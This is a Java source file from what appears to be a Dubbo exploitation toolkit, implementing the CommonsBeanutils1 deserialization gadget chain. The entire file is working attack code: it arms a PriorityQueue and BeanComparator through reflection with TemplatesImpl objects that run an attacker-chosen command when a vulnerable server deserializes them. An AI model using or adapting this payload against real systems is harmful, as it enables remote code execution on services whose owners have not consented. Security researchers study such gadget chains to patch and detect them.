package com.threedr3am.exp.dubbo.payload.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.math.BigInteger;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

/**
 * commons-beanutils:commons-beanutils:1.9.2
 */
public class CommonsBeanutils1 implements Payload {

	private String[] args;

	/**
	 *
	 * @param args
	 *
	 * arg[0]=cmd
	 *
	 * @return
	 * @throws Exception
	 */
	@Override
	public Object getPayload(String[] args) throws Exception {
		if (this.args != null)
			args = this.args;
		final Object templates = Gadgets.createTemplatesImpl(args[0]);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	@Override
	public void injectDefaultArgs(String[] args) {
		this.args = args;
	}

}
